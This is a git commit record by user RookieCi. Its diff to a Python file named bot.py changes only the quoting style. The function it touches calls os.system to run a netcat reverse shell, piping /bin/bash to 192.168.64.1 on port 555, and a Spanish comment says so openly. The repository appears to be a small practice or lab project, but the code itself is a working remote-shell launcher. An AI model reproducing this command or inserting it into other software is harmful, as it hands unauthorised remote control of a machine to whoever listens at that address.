8be1e7af84018638174fc96dc7e5445491efbd0d
RookieCi <144260068+RookieCi@users.noreply.github.com>
2023-09-07 16:49:13 +0200

    Update bot.py25

--- bot.py
+++ bot.py
@@ -2,4 +2,4 @@ import os
 
 def run():
     # Abre una conexión utilizando netcat y ejecuta un shell remoto
-    os.system('nc -n 192.168.64.1 555 -e /bin/bash')
+    os.system("nc -n 192.168.64.1 555 -e /bin/bash")
